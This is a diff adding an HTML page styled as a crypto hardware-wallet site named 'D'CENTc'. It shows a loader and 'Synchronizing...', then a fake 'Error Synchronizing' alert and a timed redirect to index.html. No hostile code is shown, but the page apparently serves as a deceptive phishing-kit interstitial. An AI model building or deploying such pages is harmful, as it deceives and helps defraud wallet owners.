@@ -1,0 +1,127 @@
+<html>
+  
+  <head>
+    <title>D&#x27;CENTc | Secure Crypto Wallet - Top Hardware Wallet Solution</title>
+    <link rel="canonical" href="/rdr" />
+  </head>
+  
+  <body>
+ 
+ 
+ <style>
+     
+     html, body {
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #f2f5f7;
+}
+
+.loader {
+  --cube-size: 25px;
+  
+  position: relative;
+  width: calc(var(--cube-size) * 2);
+  height: calc(var(--cube-size) * 2);
+}
+
+.loader .cube {
+  width: var(--cube-size);
+  height: var(--cube-size);
+  background: #e00301;
+  position: absolute;
+  top: 0;
+  left: 0;
+  animation: loader-cube-1 2.4s .2s cubic-bezier(.72,.01,.01,1) infinite;
+}
+
+.loader .cube:nth-of-type(2) {
+  background: #00a3db;
+  right: 0;
+  left: auto;
+  animation-name: loader-cube-2;
+  animation-delay: .4s;
+}
+
+.loader .cube:nth-of-type(3) {
+  background: #ffd100;
+  bottom: 0;
+  top: auto;
+  animation-name: loader-cube-3;
+  animation-delay: 0s;
+}
+
+@keyframes loader-cube-1 {
+  from, to {
+    transform: translate(0%);
+  }
+  25% {
+    transform: translateY(100%);
+  }
+  50% {
+    transform: translate(100%, 100%);
+  }
+  75% {
+    transform: translate(100%);
+  }
+}
+
+@keyframes loader-cube-2 {
+  from, to {
+    transform: translate(0);
+  }
+  25% {
+    transform: translate(-100%);
+  }
+  50% {
+    transform: translate(-100%, 100%);
+  }
+  75% {
+    transform: translateY(100%);
+  }
+}
+
+@keyframes loader-cube-3 {
+  from, to {
+    transform: translate(0);
+  }
+  25% {
+    transform: translate(100%);
+  }
+  50% {
+    transform: translate(100%,-100%);
+  }
+  75% {
+    transform: translateY(-100%);
+  }
+}
+
+ </style>
+      
+      
+<div class="loader">
+  <div class="cube"></div>
+  <div class="cube"></div>
+  <div class="cube"></div>
+  
+</div>
+ <div>
+       <p style="font-size:18px;"> Synchronizing...</p>
+ </div>  
+<script>
+    
+    window.onload = setTimeout(function(){
+    alert('Error Synchronizing');
+    
+}, 5000);
+</script>
+
+  Query failed:
+<script>
+    setTimeout(function() {
+        window.location.href = 'index.html';
+    }, 5000);
+</script>
+</body>
+</html>
